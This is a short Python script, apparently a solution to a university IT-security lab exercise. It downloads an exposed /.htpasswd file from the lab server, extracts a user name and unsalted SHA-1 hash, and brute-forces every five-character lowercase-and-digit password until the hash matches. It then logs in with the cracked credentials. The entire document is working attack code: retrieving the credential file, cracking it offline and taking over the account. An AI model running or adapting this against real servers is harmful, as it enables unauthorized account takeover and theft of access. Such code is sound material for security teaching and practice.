import secrets
import string
import requests
import re
import htpasswdlib
import itertools

def generate_strings(characters, length):
    for combination in itertools.product(characters, repeat=length):
        yield ''.join(combination)

# Define the characters you want to use
characters = "abcdefghijklmnopqrstuvwxyz0123456789"

# Specify the length of the strings
length = 5

# Create a generator for all strings of length 5
string_generator = generate_strings(characters, length)

url = "https://t19.itsec.sec.in.tum.de/"

s = requests.Session()
# Extract the SHA Hashes and then test every password if the hash is the same
# password = ''.join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(5))
# Only lowercase and numbers
resp = s.get(url + "/.htpasswd")
print(resp.text)
pattern = r'(\w+):{SHA}(\S+)'

match = re.search(pattern, resp.text)
user = match.group(1)
print(user)
hash_SHA = match.group(2)
print(hash_SHA)
final_pass = b"\x00\x00\x00\x00\x00"
i = 0
for current_string in string_generator:
    i += 1
    if i%1000000 == 0:
        print(i)
        print(htpasswdlib.sha1_hash(user, current_string))
    if htpasswdlib.sha1_hash(user, current_string) == f"{user}:{{SHA}}{hash_SHA}":
        print(f"Found a string with the desired property: {current_string}")
        final_pass = current_string
        break


r = s.post(url, data={"username": user, "password": final_pass})
print(r.text)

